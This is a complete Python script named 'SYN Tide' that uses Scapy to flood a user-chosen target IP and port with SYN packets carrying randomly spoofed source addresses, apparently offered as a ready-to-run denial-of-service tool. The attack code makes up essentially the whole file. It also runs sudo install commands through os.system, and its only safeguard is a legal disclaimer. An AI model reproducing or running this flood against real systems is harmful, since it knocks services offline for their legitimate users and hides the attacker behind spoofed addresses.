#!/usr/bin/python3

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   Orange='\033[33m'
   lightblue='\033[94m'
   lightcyan='\033[96m'
   BLUE = '\033[94m'
   Black = '\033[30m'
   GREEN = '\033[92m'
   pink='\033[95m'
   lightgreen='\033[92m'
   lightred='\033[91m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

def logo():
    print(color.Orange + "#"*50)
    print(color.PURPLE +"""
                   (        )     )
 )\ )  ( /(  ( /(   *   )      (
(()/(  )\()) )\())` )  /( (    )\ )   (
 /(_))((_)\ ((_)\  ( )(_)))\  (()/(  ))\
(_)) __ ((_) _((_)(_(_())((_)  ((_))/((_)
/ __|\ \ / /| \| ||_   _| (_)  _| |(_))
\__ \ \ V / | .` |  | |   | |/ _` |/ -_)
|___/  |_|  |_|\_|  |_|   |_|\__,_|\___|
          """ )
    print(color.Orange + "#"*50 + color.END )

import os
import platform
import sys
import time
from random import randint

from scapy.all import *

current_time = color.RED + str([time.asctime()])  #gives day,date,time,year

def screen_clear():
    if os.name == 'posix': #for linux,unix,mac
      _ = os.system('clear')
    else:   #windows
     _ = os.system('cls')

def dependencies_check():
  screen_clear()
  print(current_time + color.BOLD + color.GREEN +  "  Checking for dependencies.....")
  import scapy
  time.sleep(1)
  print(current_time + color.BOLD  + color.GREEN + "  Dependencies satsfied.....")
  time.sleep(0.5)
  screen_clear()

def error_import():
  print("\n\n")
  print(color.BOLD + color.RED + color.UNDERLINE + "*"*50)
  print(color.BOLD + color.UNDERLINE + color.RED+ "INSTALLATION ERROR ===>" + color.Black + "It Seems Dependencies are not getting properly installed on your system. \nWe recommend you to Install " + color.RED + "Scapy" + color.Black +" module by our own according to your respective system'\n" + color.RED +"SOME KNOWN COMMANDS YOU CAN TRY : " + color.Black + "\n==> For Linux and Mac : \n* sudo apt-get install python3-scapy  \n* sudo pip3 install scapy  \n==> For Termux and Windows  : \n* pip3 install scapy \n* pip3 install scapy \nIf still Bug Remains Contact the develpor :)"+ color.END)
  print(color.BOLD + color.RED + "*"*50)
  print("")
  time.sleep(4)


def pip_Error():
    print("\n\n")
    print(color.RED + color.UNDERLINE + "*"*50)
    print(color.RED +  color.UNDERLINE + "PIP ERROR ===>" + color.Black + "It seems that python3-pip is not getting installed in your system. \nWe recommend you to install " + color.RED + "PIP" + color.Black + " by your own.\nSome suggestion to use ===> \nFor Termux : "+color.RED+"\n* apt install python3-pip "+color.Black+"\nFor Linux : "+color.RED+" \n* sudo apt install python3-pip  "+color.Black+"\nFor Windows : \n* install pip3 pkg from "+color.RED+"site: https://bootstrap.pypa.io/get-pip.py "+color.Black+"\n* and after Downloading run "+ color.RED + "python get-pip.py"+ color.Black+"in your cmd.exe \nFor Mac : "+color.RED+"\n* sudo easy_install pip "+color.Black+"\nIf still Bug Remains Contact the develpor :)" + color.END)   
    print(color.RED + "*"*50)
    print("")
    time.sleep(4)

try:
        dependencies_check()
except ImportError:
        print(current_time + color.GREEN + color.BOLD + "  Dependency Not Satisfied.....")
        time.sleep(0.5)
        print(current_time + color.GREEN + color.BOLD + "  Installing Required Dependency.....")
        time.sleep(0.5)
        print(current_time + color.BOLD + color.GREEN + "  Identifying your system")
        if platform.system() == 'Linux': ##system is linux/Termux
            time.sleep(0.5)
            print(current_time + color.BOLD + color.GREEN + "  system identified !!" + color.END)
            print(current_time + color.BOLD + color.GREEN + "  your system is : %s" %platform.system() + color.END)
            time.sleep(0.5)
            try:
                print(current_time + color.BOLD + color.GREEN + "  Checking for pip in your system....")
                os.system('sudo apt install python3-pip')
                print(current_time + color.BOLD + color.GREEN + "  Upgrading PIP....")
                time.sleep(0.5)
                os.system('pip3 install --upgrade pip')
                try:
                    print(current_time + color.BOLD + color.GREEN + "  installing Scapy module...\n" + color.END)
                    time.sleep(0.5)
                    os.system('pip3 install scapy')
                    print("\n\n")
                    print(current_time + color.GREEN + color.BOLD + "  All dependency uploaded\n")
                    time.sleep(2)
                    try:
                        dependencies_check()
                    except:
                        error_import()
                except:
                    error_import()
            except:
                 pip_Error()

        elif platform.system() == 'Darwin': #mac
            time.sleep(0.5)
            print(current_time + color.BOLD + color.GREEN + "  system identified !!" + color.END)
            print(current_time + color.BOLD + color.GREEN + "  your system is : %s" %platform.system() + color.END)
            time.sleep(0.5)
            try:
                print(current_time + color.BOLD + color.GREEN + "  Print Checking for pip in your system....")
                os.system('sudo easy_install pip')
                print(current_time + color.BOLD + color.GREEN + "  Upgrading PIP....")
                time.sleep(0.5)
                os.system('pip3 install --upgrade pip')
                time.sleep(0.5)
                try:
                    print(current_time + color.BOLD + color.GREEN + "  installing Scapy module..." + color.END)
                    time.sleep(0.5)
                    os.system('sudo pip3 install scapy')
                    print("\n\n")
                    print(current_time + color.GREEN + color.BOLD + "  All dependency uploaded")
                    time.sleep(2)
                    try:
                        dependencies_check()
                    except:
                        error_import()
                except:
                    error_import()
            except:
                pip_Error()

        else:  #window
            time.sleep(0.5)
            print(current_time + color.BOLD + color.GREEN + "  system identified !!" + color.END)
            print(current_time + color.BOLD + color.GREEN + "  your system is : %s" %platform.system() + color.END)
            time.sleep(0.5)
            try:
                print(current_time + color.BOLD + color.GREEN + "  Print Checking for PIP in your system....")
                os.system('python -m pip --upgrade pip')
                print(current_time + color.BOLD + color.GREEN + "  PIP succesfully upgraded!!!!!")
                try:
                    print(current_time + color.BOLD + color.GREEN + "  installing Scapy module..." + color.END)
                    time.sleep(0.5)
                    os.system('pip3 install scapy')
                    print("\n\n")
                    print(current_time + color.GREEN + color.BOLD + "  All dependency uploaded")
                    time.sleep(2)
                    try:
                        dependencies_check()
                    except:
                        error_import()
                except:
                    error_import()
            except:
                pip_Error()


def fakeIP():
        ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
        return ip

def randInt():
        p = randint(1,65535)
        return p

def SYN_Tide(dstIP,dstPort,counter):
    try:
        total = 0
        print("\n")
        print(color.GREEN +"#"*50 + color.END)
        print (color.CYAN +"Sending Packet to " +color.lightblue+ "%s" %dstIP +color.END)
        print(color.GREEN +"#" *50)
        print(color.CYAN +" Sending Packet......" + color.END)
        print(color.GREEN +"#"* 50 + color.END)
        print("")
        for x in range (0,counter):
            s_port = randInt()
            s_eq = randInt()
            w_indow = randInt()
            IP_Packet = IP ()
            IP_Packet.src = fakeIP()
            IP_Packet.dst = dstIP
            TCP_Packet = TCP ()
            TCP_Packet.sport = s_port
            TCP_Packet.dstport = dstPort
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow
            send(IP_Packet/TCP_Packet, verbose=0)
            total += 1
            print(current_time  + color.GREEN + " %s sent packet." %total)
        time.sleep(2)
        print(color.RED + color.BOLD +" Total Packet send to the Target : "+color.CYAN+"%s" %total  + color.END)
        time.sleep(2)
        sys.exit()
    except PermissionError as permit :
        print("")
        print(permit)
        print("")
        print(color.pink + "*"*50)
        print(color.RED + color.BOLD + "ERROR ==> Re-Run Script with sudo" + color.END)
        print(color.pink + "*"*50)
        print("")
        sys.exit()

    except socket.gaierror as gaierror:
        print("")
        print(color.BLUE + color.BOLD + "Error ==> Socket.gaierror" + color.END)
        print(gaierror)
        print("")
        print(color.pink +"*"*50)
        print(color.RED +"It seems invalid target is entered ")
        print("")
        sys.exit()

    except socket.timeout as timeout :
        print(timeout)
        print(color.BLUE + "\n Server TimeOut...!!!" + color.END)
        sys.exit()

    except socket.error as error:
        print(error)
        print(color.BLUE + "\n Server Not Responding...!!!" + color.END)
        sys.exit()

    except KeyboardInterrupt as c :
        print("\n")
        print("KeyboardInterrupt")
        print(color.BLUE + "*"*50)
        print(color.RED + "Oops You Cloesd The Program.....!!!")
        sys.exit()

def info():
    try:
        logo()
        print("")
        print(color.END + "Description : A SYN Tide or SYN flood is a form of denial-of-service attack in which an attacker sends a succession of SYN requests to a target's system in an attempt to consume enough server resources to make the system unresponsive to legitimate traffic.")
        print("")
        print(color.RED + "========================================================================")
        print(color.GREEN +"\nLEGAL DISCLAIMER: This Tool contains materials that can be potentially damaging or dangerous.It is the end users responsibility to obey all applicable local, state and federal laws.Developers assume no liability and are not responsible for any misuse or damage caused by this program.\n")
        print(color.RED+ "========================================================================" )
        dstIP = input(color.BOLD + color.BLUE +   "\nTarget : " + color.END)
        dstPort = input(color.BLUE + color.BOLD + "Target Port : " + color.END)
        return dstIP , dstPort

    except KeyboardInterrupt as c :
        print("\n")
        print("KeyboardInterrupt")
        print(color.BLUE + "*"*50)
        print(color.RED + "Oops You Cloesd The Program.....!!!")
        sys.exit()



def main():
    try:
        dstIP,dstPort = info()
        counter = input(color.BLUE + color.BOLD + "Number of Packets you want to send : "+ color.END)
        SYN_Tide(dstIP,dstPort,int(counter))
    except KeyboardInterrupt as c :
        print("\n")
        print("KeyboardInterrupt")
        print(color.BLUE + "*"*50)
        print(color.RED + "Oops You Cloesd The Program.....!!!")
        sys.exit()
    except PermissionError as permit :
        print("")
        print(permit)
        print("")
        print(color.pink + "*"*50)
        print(color.BOLD + color.RED + "ERROR ==> Re-Run Script with sudo" + color.END)
        print(color.pink + "*"*50)
        print("")
        sys.exit()


main()
